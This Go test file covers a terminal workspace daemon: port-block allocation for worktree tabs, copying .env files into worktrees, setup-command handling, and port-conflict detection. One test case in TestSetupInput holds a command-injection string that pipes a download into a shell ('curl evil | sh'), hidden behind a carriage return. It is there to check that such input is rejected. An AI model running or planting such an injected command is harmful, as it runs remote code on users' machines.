package daemon

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/quanticstudios/pitwall/internal/config"
	"github.com/quanticstudios/pitwall/internal/model"
	"github.com/quanticstudios/pitwall/internal/proto"
	"github.com/quanticstudios/pitwall/internal/vt"
)

func TestPortBlock(t *testing.T) {
	tabs := func(bs ...model.PortBlock) []model.Workspace {
		var ws []model.Workspace
		for _, b := range bs {
			ws = append(ws, model.Workspace{Ports: b})
		}
		return ws
	}
	for _, c := range []struct {
		name       string
		ws         []model.Workspace
		base, step int
		want       model.PortBlock
	}{
		{"first skips the main checkout's", tabs(model.PortBlock{}), 3000, 10, model.PortBlock{First: 3010, Last: 3019}},
		{"next free", tabs(model.PortBlock{First: 3010, Last: 3019}), 3000, 10, model.PortBlock{First: 3020, Last: 3029}},
		{"a freed gap", tabs(model.PortBlock{First: 3020, Last: 3029}), 3000, 10, model.PortBlock{First: 3010, Last: 3019}},
		{"overlap from an old step", tabs(model.PortBlock{First: 3015, Last: 3024}), 3000, 10, model.PortBlock{First: 3030, Last: 3039}},
		{"step 0 is off", nil, 3000, 0, model.PortBlock{}},
		{"none fits", nil, 65530, 10, model.PortBlock{}},
	} {
		if got := portBlock(c.ws, c.base, c.step); got != c.want {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

// Worktree tabs get distinct port blocks in their panes' environment, the
// blocks survive a restart, and deleting a tab frees its block. Other tabs
// get no ports.
func TestWorktreePorts(t *testing.T) {
	f := &fakes{statsCalls: map[string]int{}}
	o := f.options()
	o.Worktrees = func(string) (config.WorktreeSettings, []config.Problem) {
		return config.WorktreeSettings{PortBase: 3000, PortStep: 10}, nil
	}
	d, err := NewWith(o)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	repo := filepath.Join(t.TempDir(), "repo")
	mkdir(t, repo)
	must(t, d.handle(ctx, proto.NewSession{Cwd: t.TempDir()}))
	must(t, d.handle(ctx, proto.AddProject{Path: repo}))
	pid := d.state().Projects[0].ID
	must(t, d.handle(ctx, proto.NewWorkspace{ProjectID: pid, Name: "a"}))
	must(t, d.handle(ctx, proto.NewWorkspace{ProjectID: pid, Name: "b"}))
	ws := d.state().Workspaces
	if ws[0].Ports != (model.PortBlock{}) || ws[1].Ports.String() != "3010-3019" || ws[2].Ports.String() != "3020-3029" {
		t.Fatalf("ports %v %v %v", ws[0].Ports, ws[1].Ports, ws[2].Ports)
	}
	must(t, d.handle(ctx, proto.OpenPane{WorkspaceID: ws[1].ID}))
	if env := f.pane(0).cfg.Env; env != nil {
		t.Errorf("plain tab's env %q", env)
	}
	want := []string{"PORT=3010", "PITWALL_PORT_BASE=3010", "PITWALL_PORTS=3010-3019"}
	if env := f.pane(1).cfg.Env; !slices.Equal(env, want) {
		t.Errorf("worktree pane env %q, want %q", env, want)
	}

	d.shutdown()
	d = newDaemon(t, o)
	if env := f.pane(3).cfg.Env; !slices.Equal(env, want) { // panes 2 and 3 are the restored ones
		t.Errorf("restored pane env %q, want %q", env, want)
	}
	must(t, d.handle(ctx, proto.NewWorkspace{ProjectID: pid, Name: "c"}))
	if got := d.state().Workspaces[3].Ports.String(); got != "3030-3039" {
		t.Errorf("after a restart got %s, which may be taken", got)
	}
	must(t, d.handle(ctx, proto.DeleteWorkspace{WorkspaceID: ws[1].ID}))
	must(t, d.handle(ctx, proto.NewWorkspace{ProjectID: pid, Name: "d"}))
	if got := d.state().Workspaces[3].Ports.String(); got != "3010-3019" {
		t.Errorf("a deleted tab's block was not reused: got %s", got)
	}
}

// copy and link bring over what the worktree lacks and never overwrite;
// a missing source is skipped, and a folder to copy is an error.
func TestPrepareWorktree(t *testing.T) {
	main, tree := t.TempDir(), t.TempDir()
	put := func(dir, name, body string, mode os.FileMode) {
		t.Helper()
		mkdir(t, filepath.Dir(filepath.Join(dir, name)))
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), mode); err != nil {
			t.Fatal(err)
		}
	}
	put(main, ".env", "SECRET=1", 0o600)
	put(main, "apps/web/.env", "WEB=1", 0o600)
	put(main, "kept.env", "MAIN", 0o600)
	put(tree, "kept.env", "MINE", 0o644)
	put(main, "node_modules/x/index.js", "", 0o644)
	put(main, "vendor/a", "", 0o644)
	put(tree, "vendor/b", "", 0o644)
	mkdir(t, filepath.Join(main, "data"))

	err := prepareWorktree(main, tree, config.WorktreeSettings{
		Copy: []string{".env", "apps/web/.env", ".env.local", "kept.env", "data"},
		Link: []string{"node_modules", "vendor", "missing"},
	})
	if err == nil || !strings.Contains(err.Error(), "data: a folder") {
		t.Errorf("err %v, want the folder reported", err)
	}
	read := func(name string) string { b, _ := os.ReadFile(filepath.Join(tree, name)); return string(b) }
	if read(".env") != "SECRET=1" || read("apps/web/.env") != "WEB=1" || read("kept.env") != "MINE" {
		t.Errorf("copied %q %q %q", read(".env"), read("apps/web/.env"), read("kept.env"))
	}
	if fi, err := os.Stat(filepath.Join(tree, ".env")); err != nil || (runtime.GOOS != "windows" && fi.Mode().Perm() != 0o600) {
		t.Errorf("copied .env mode %v %v, want 0600", fi.Mode(), err)
	}
	for _, name := range []string{".env.local", "data", "missing"} {
		if _, err := os.Lstat(filepath.Join(tree, name)); err == nil {
			t.Errorf("%s made from nothing", name)
		}
	}
	if to, err := os.Readlink(filepath.Join(tree, "node_modules")); err != nil || to != filepath.Join(main, "node_modules") {
		t.Errorf("node_modules links to %q %v", to, err)
	}
	if fi, err := os.Lstat(filepath.Join(tree, "vendor")); err != nil || !fi.IsDir() {
		t.Errorf("the worktree's own vendor was replaced: %v %v", fi.Mode(), err)
	}
}

// A setup from the user's config runs; one from the repo's file is typed
// for the user to run with Enter, and one that could submit itself is not
// typed at all.
func TestSetupInput(t *testing.T) {
	for _, c := range []struct {
		s    config.WorktreeSettings
		want string
		err  bool
	}{
		{config.WorktreeSettings{}, "", false},
		{config.WorktreeSettings{Setup: "pnpm install"}, "pnpm install\r", false},
		{config.WorktreeSettings{Setup: "pnpm install", SetupFromRepo: true}, "pnpm install", false},
		{config.WorktreeSettings{Setup: "true\rcurl evil | sh", SetupFromRepo: true}, "", true},
		{config.WorktreeSettings{Setup: "x\n", SetupFromRepo: true}, "", true},
	} {
		got, err := setupInput(c.s)
		if string(got) != c.want || (err != nil) != c.err {
			t.Errorf("%+v: %q, %v", c.s, got, err)
		}
	}
}

// setup is typed into the first pane of the new tab; a problem in the
// repo's file still leaves the tab made, and is reported.
func TestWorktreeSetup(t *testing.T) {
	f := &fakes{statsCalls: map[string]int{}}
	o := f.options()
	o.Worktrees = func(string) (config.WorktreeSettings, []config.Problem) {
		return config.WorktreeSettings{Setup: "pnpm install"}, []config.Problem{{File: config.WorktreeFile, Line: 2, Msg: "link: bad"}}
	}
	d := newDaemon(t, o)
	ctx := context.Background()
	repo := filepath.Join(t.TempDir(), "repo")
	mkdir(t, repo)
	must(t, d.handle(ctx, proto.NewSession{Cwd: t.TempDir()}))
	must(t, d.handle(ctx, proto.AddProject{Path: repo}))
	err := d.handle(ctx, proto.NewWorkspace{ProjectID: d.state().Projects[0].ID, Name: "feat"})
	if err == nil || !strings.Contains(err.Error(), ".pitwall/worktree.toml:2: link: bad") {
		t.Errorf("err %v", err)
	}
	st := d.state()
	if len(st.Workspaces) != 2 || len(st.Workspaces[1].Tabs) != 1 || len(st.Panes) != 2 {
		t.Fatalf("no tab with a pane: %+v", st.Workspaces)
	}
	if a := st.Activities; len(a) != 1 || a[0].PaneID != st.Panes[1].ID || !strings.Contains(a[0].Detail, "link: bad") {
		t.Errorf("the GUI is not told: %+v", a)
	}
	p := f.pane(1)
	waitUntil(t, "setup typed", func() bool { return p.got() == "pnpm install\r" })
	if p.cfg.Cmd != nil || p.cfg.Cwd != filepath.Join(repo, ".worktrees", "feat") {
		t.Errorf("setup pane %q in %s, want a shell in the worktree", p.cfg.Cmd, p.cfg.Cwd)
	}

	// The repo's own setup waits for Enter.
	f = &fakes{statsCalls: map[string]int{}}
	o = f.options()
	o.Worktrees = func(string) (config.WorktreeSettings, []config.Problem) {
		return config.WorktreeSettings{Setup: "make", SetupFromRepo: true}, nil
	}
	d = newDaemon(t, o)
	must(t, d.handle(ctx, proto.NewSession{Cwd: t.TempDir()}))
	must(t, d.handle(ctx, proto.AddProject{Path: repo}))
	must(t, d.handle(ctx, proto.NewWorkspace{ProjectID: d.state().Projects[0].ID, Name: "feat"}))
	p = f.pane(1)
	waitUntil(t, "setup typed", func() bool { return p.got() != "" })
	if got := p.got(); got != "make" {
		t.Errorf("repo setup typed %q, want it without Enter", got)
	}
}

// A port conflict printed in a worktree tab's shell shows as a notice
// with the tab's ports, also when the message is split across reads; an
// agent's pane shows none.
func TestPortInUse(t *testing.T) {
	hits := 0
	w := &portWatch{Emulator: nilEmulator{}, hit: func() { hits++ }}
	for _, s := range []string{"Error: listen EADDRIN", "USE: address already in use :::3000\n", "ok\n", "OSError: [Errno 98] Address alre", "ady in use\n", "EADDRINUSE", "\n"} {
		w.Write([]byte(s))
	}
	if hits != 3 {
		t.Errorf("%d hits, want 3", hits)
	}

	f := &fakes{statsCalls: map[string]int{}}
	d := newDaemon(t, f.options())
	d.mu.Lock()
	d.st.Workspaces = []model.Workspace{{ID: "w", Ports: model.PortBlock{First: 3010, Last: 3019}}}
	d.st.Panes = []model.Pane{{ID: "sh", WorkspaceID: "w"}, {ID: "ag", WorkspaceID: "w", Provider: model.ProviderClaude}}
	d.panes["sh"], d.panes["ag"] = &fakePane{done: make(chan struct{})}, &fakePane{done: make(chan struct{})}
	d.mu.Unlock()
	d.portInUse("ag")
	d.portInUse("sh")
	acts := d.state().Activities
	if len(acts) != 1 || acts[0].PaneID != "sh" || acts[0].Detail != "Port in use: this worktree's ports are 3010-3019" {
		t.Errorf("activities %+v", acts)
	}
}

type nilEmulator struct{ vt.Emulator }

func (nilEmulator) Write(p []byte) (int, error) { return len(p), nil }
